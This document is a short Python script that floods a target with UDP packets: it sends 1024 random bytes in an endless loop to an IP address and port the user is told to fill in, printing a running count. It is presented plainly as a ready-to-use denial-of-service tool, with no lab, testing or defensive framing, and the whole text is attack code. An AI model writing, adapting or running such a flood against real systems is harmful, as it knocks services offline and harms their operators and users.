import socket
import random

target_ip = "(Targets ip)"   #Change this to the targets ip
target_port = (targets port) #Change this to the targets port

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

data = random._urandom(1024)

counter = 1

while True:
    sock.sendto(data, (target_ip, target_port))
    print(f"UDP Packet no.{counter} sent to {target_ip}:{target_port}")
    counter += 1
